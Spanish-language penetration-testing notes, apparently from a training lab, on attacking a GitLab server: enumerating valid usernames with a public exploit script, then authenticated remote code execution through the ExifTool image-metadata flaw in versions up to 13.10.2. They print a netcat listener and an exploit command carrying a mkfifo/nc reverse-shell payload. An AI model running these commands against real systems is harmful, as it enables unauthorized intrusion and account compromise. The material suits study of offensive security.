
Vimos como con un usuario no autorizado inventado conseguimos informacion

Si lo hubiesemos hecho con un usuario real de la compañia o un admin, podriamos a ver conseguido suficiente informacion como para comprometer el dominio completo

## Enumeracion de nombres de usuario

Podemos usar este [script](https://www.exploit-db.com/exploits/49821) para enumerar una lista de usuario validos

La version Python3 es [esta](https://github.com/dpgg101/GitLabUserEnum)

Tenemos que tener cuidado con no bloquear cuentas. En versiones menores a 16.6 hay 10 intentos sino 10min de bloqueo

A partir de entonces se puede cambiar desde el portal del Administrator


Descargamos el script y al usuarlo vemos nombres de usuario como: `bob y root`

```
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

## Ejecucion remota de codigo autenticada

 Versión 13.10.2 y anteriores sufrían de una vulnerabilidad de ejecución remota de código autenticada ([vulnerability](https://hackerone.com/reports/1154542)) debido a un problema con la forma en que ExifTool manejaba los metadatos en los archivos de imagen subidos

[Exploit](https://www.exploit-db.com/exploits/49951) para descargar

Primero necesitamos un nombre de usuario y contraseña validos ya sea de un autoregistro o de usuarios reales

```
nc -nvlp 8443
```

```
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u USER -p PASSS -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP 8443 >/tmp/f '
```
